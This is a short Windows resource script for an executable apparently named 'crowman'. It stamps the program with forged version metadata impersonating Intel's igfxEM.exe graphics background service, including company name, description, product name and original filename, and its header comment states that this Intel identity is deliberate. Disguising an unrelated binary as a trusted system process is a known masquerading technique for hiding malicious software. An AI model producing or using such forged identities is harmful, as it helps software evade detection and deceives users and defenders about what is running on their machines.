// Single resource script for the target.
// Carries the Intel igfxEM identity, the real project icon and the manifest.
#include <winver.h>
#include "resource.h"

#ifndef IDI_APP
#define IDI_APP 1
#endif

IDI_APP ICON "crowman.ico"
1 24 "app.manifest"

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 10,0,19041,1
 PRODUCTVERSION 10,0,19041,1
 FILEFLAGSMASK 0x3fL
 FILEFLAGS 0x0L
 FILEOS VOS_NT_WINDOWS32
 FILETYPE VFT_APP
 FILESUBTYPE VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Intel Corporation"
            VALUE "FileDescription",  "Intel(R) HD Graphics Background Service"
            VALUE "FileVersion",      "10.0.19041.1"
            VALUE "InternalName",     "igfxEM.exe"
            VALUE "LegalCopyright",   "Copyright (C) Intel Corporation"
            VALUE "OriginalFilename", "igfxEM.exe"
            VALUE "ProductName",      "Intel(R) Graphics Media Accelerator Driver"
            VALUE "ProductVersion",   "10.0.19041.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END